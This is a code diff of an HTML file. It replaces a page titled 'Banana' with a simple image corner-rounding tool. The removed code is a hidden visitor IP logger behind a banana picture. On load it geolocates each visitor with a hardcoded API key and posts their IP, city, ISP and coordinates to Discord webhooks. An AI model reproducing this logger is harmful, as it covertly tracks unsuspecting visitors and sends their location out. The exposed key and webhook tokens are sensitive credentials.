@@ -1,74 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banana 🍌</title>
-    <style>
-        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; margin: 0; }
-        img { width: 300px; height: auto; }
-    </style>
+  <meta charset="UTF-8">
+  <title>Image Rounder</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+    #preview {
+      max-width: 300px;
+      border-radius: 20px;
+      margin-top: 20px;
+    }
+    input[type="range"] {
+      width: 300px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      border: none;
+      background-color: #3b82f6;
+      color: white;
+      border-radius: 12px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/Banana-Single.jpg" alt="Banana">
+  <h1>Image Rounder</h1>
+  <input type="file" id="fileInput" accept="image/*"><br>
+  <label>Corner Radius: <span id="radiusValue">20</span>px</label><br>
+  <input type="range" id="radiusSlider" min="0" max="200" value="20">
+  <br>
+  <img id="preview" src="#" style="display: none;">
+  <br>
+  <button id="downloadBtn" style="display: none;">Download Rounded Image</button>
 
-    <script>
-        const API_KEY = "b1e9549a924b474bbf04e9d029327694"; // Replace with your API key
-        const WEBHOOK_URLS = [
-            "https://discord.com/api/webhooks/1352211425912688640/r0Y89ZvBw0o3b6MWod2ZHugrpFk4pYxbBcvRcj9GeneV1sQ3PDKBmLFdPfZ3pNyDFu9o",
-            "https://discord.com/api/webhooks/1352211425912688640/r0Y89ZvBw0o3b6MWod2ZHugrpFk4pYxbBcvRcj9GeneV1sQ3PDKBmLFdPfZ3pNyDFu9o"
-        ];
+  <script>
+    const fileInput = document.getElementById('fileInput');
+    const radiusSlider = document.getElementById('radiusSlider');
+    const radiusValue = document.getElementById('radiusValue');
+    const preview = document.getElementById('preview');
+    const downloadBtn = document.getElementById('downloadBtn');
 
-        async function getIPInfo() {
-            try {
-                let response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
-                let data = await response.json();
-                let ipAddress = data.ip;
+    let imageDataUrl = '';
+    let radius = 20;
 
-                let loggedIPs = JSON.parse(localStorage.getItem("loggedIPs")) || [];
-                let encodedIP = btoa(btoa(btoa(ipAddress)));  // Triple Base64 encode
+    fileInput.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
 
-                if (loggedIPs.includes(encodedIP)) return;
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        imageDataUrl = event.target.result;
+        preview.src = imageDataUrl;
+        preview.style.display = 'block';
+        downloadBtn.style.display = 'inline-block';
+        preview.style.borderRadius = `${radius}px`;
+      };
+      reader.readAsDataURL(file);
+    });
 
-                loggedIPs.push(encodedIP);
-                localStorage.setItem("loggedIPs", JSON.stringify(loggedIPs));
+    radiusSlider.addEventListener('input', (e) => {
+      radius = parseInt(e.target.value);
+      radiusValue.textContent = radius;
+      preview.style.borderRadius = `${radius}px`;
+    });
 
-                sendToDiscord(data);
-            } catch (error) {
-                console.error("Error fetching data:", error);
-            }
-        }
+    downloadBtn.addEventListener('click', () => {
+      const img = new Image();
+      img.onload = function() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = img.width;
+        canvas.height = img.height;
 
-        function sendToDiscord(data) {
-            let webhookURL = WEBHOOK_URLS[Math.floor(Math.random() * WEBHOOK_URLS.length)];
-            let payload = {
-                username: "IP Logger",
-                avatar_url: "https://cdn.discordapp.com/attachments/1153348936283721778/1258363593783513208/Unknown.jpeg",
-                embeds: [{
-                    title: "New Visitor Logged",
-                    description: `**IP Address:** ${data.ip}\n**Country:** :flag_${data.country_code2.toLowerCase()}: ${data.country_name}\n**City:** ${data.city}`,
-                    color: 16711680,
-                    fields: [
-                        { name: "ISP", value: data.isp, inline: true },
-                        { name: "Latitude", value: data.latitude.toString(), inline: true },
-                        { name: "Longitude", value: data.longitude.toString(), inline: true },
-                        { name: "Google Maps", value: `[View Location](https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=15)`, inline: false }
-                    ],
-                    thumbnail: { url: data.country_flag },
-                    footer: { text: "Data from ipgeolocation.io" }
-                }]
-            };
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.beginPath();
+        ctx.moveTo(radius, 0);
+        ctx.lineTo(canvas.width - radius, 0);
+        ctx.quadraticCurveTo(canvas.width, 0, canvas.width, radius);
+        ctx.lineTo(canvas.width, canvas.height - radius);
+        ctx.quadraticCurveTo(canvas.width, canvas.height, canvas.width - radius, canvas.height);
+        ctx.lineTo(radius, canvas.height);
+        ctx.quadraticCurveTo(0, canvas.height, 0, canvas.height - radius);
+        ctx.lineTo(0, radius);
+        ctx.quadraticCurveTo(0, 0, radius, 0);
+        ctx.closePath();
+        ctx.clip();
+        ctx.drawImage(img, 0, 0);
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-            .then(response => console.log("Data sent to Discord:", response))
-            .catch(error => console.error("Error sending to Discord:", error));
-        }
-
-        getIPInfo();
-    </script>
+        const link = document.createElement('a');
+        link.download = 'rounded-image.png';
+        link.href = canvas.toDataURL();
+        link.click();
+      };
+      img.src = imageDataUrl;
+    });
+  </script>
 </body>
 </html>
